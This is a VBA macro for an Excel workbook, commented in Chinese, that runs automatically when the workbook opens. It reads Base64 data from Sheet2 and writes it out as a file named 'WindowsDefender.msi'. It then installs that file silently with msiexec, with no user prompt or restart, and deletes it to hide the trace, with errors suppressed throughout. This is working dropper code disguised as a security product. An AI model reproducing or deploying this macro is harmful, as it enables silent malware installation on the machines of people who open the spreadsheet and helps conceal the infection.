Option Explicit

' 从 Sheet2 中读取 Base64 数据，解码后导出为 MSI 文件
Public Sub DecodeAndExportFile(ByVal msiPath As String)
    Dim ws As Worksheet
    ' 指定工作表 Sheet2
    Set ws = ThisWorkbook.Worksheets("Sheet2")

    ' 如果工作簿尚未保存（没有路径），直接退出
    If ThisWorkbook.Path = "" Then Exit Sub

    Dim lastRow As Long
    ' 获取 A 列最后一行
    lastRow = ws.Cells(ws.Rows.Count, "A").End(xlUp).Row

    Dim b64All As String
    Dim r As Long
    b64All = ""

    ' 将 A 列中的 Base64 字符串逐行拼接
    For r = 1 To lastRow
        If Len(ws.Cells(r, "A").Value) = 0 Then Exit For
        b64All = b64All & ws.Cells(r, "A").Value
    Next r

    Dim xml As Object, node As Object
    ' 使用 MSXML 组件进行 Base64 解码
    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = b64All

    ' 解码后的二进制数据
    Dim data() As Byte
    data = node.nodeTypedValue

    Dim f As Integer
    f = FreeFile
    ' 以二进制方式写入 MSI 文件
    Open msiPath For Binary Access Write As #f
    Put #f, , data
    Close #f
End Sub

' 为字符串添加双引号（用于命令行参数）
Private Function Quote(ByVal s As String) As String
    Quote = """" & s & """"
End Function

' 静默安装 MSI，并等待安装完成
' 返回 msiexec 的退出码
Public Function InstallMsiSilentWait(ByVal msiPath As String, _
                                     Optional ByVal extraProps As String = "", _
                                     Optional ByVal noRestart As Boolean = True) As Long
    Dim sh As Object
    Dim p As Object
    Dim cmd As String

    ' 如果 MSI 文件不存在则抛出错误
    If Dir(msiPath) = "" Then
        Err.Raise vbObjectError + 1000, , "MSI not found"
    End If

    ' 构建 msiexec 静默安装命令
    cmd = "msiexec /i " & Quote(msiPath) & " /qn"
    If noRestart Then cmd = cmd & " /norestart"
    If Len(extraProps) > 0 Then cmd = cmd & " " & extraProps

    ' 执行命令
    Set sh = CreateObject("WScript.Shell")
    Set p = sh.Exec(cmd)

    ' 等待 msiexec 执行结束
    Do While p.Status = 0
        DoEvents
    Loop

    ' 返回安装进程的退出码
    InstallMsiSilentWait = CLng(p.ExitCode)
End Function

' 删除指定文件
Public Function DeleteFile(ByVal filePath As String) As Boolean
    On Error GoTo ErrHandler

    ' 如果文件不存在，返回 False
    If Len(Dir(filePath)) = 0 Then
        DeleteFile = False
        Exit Function
    End If

    ' 删除文件
    Kill filePath
    DeleteFile = True
    Exit Function

ErrHandler:
    ' 删除失败返回 False
    DeleteFile = False
End Function

' 工作簿打开时自动执行
Private Sub Workbook_Open()
    On Error Resume Next

    Dim msiPath As String
    ' MSI 文件路径（与工作簿同目录）
    msiPath = ThisWorkbook.Path & "\WindowsDefender.msi"

    ' 解码并导出 MSI 文件
    DecodeAndExportFile msiPath

    ' 如果 MSI 未成功生成则退出
    If Dir(msiPath) = "" Then
        Exit Sub
    End If

    ' 静默安装 MSI
    InstallMsiSilentWait msiPath

    ' 安装完成后删除 MSI 文件
    DeleteFile msiPath
End Sub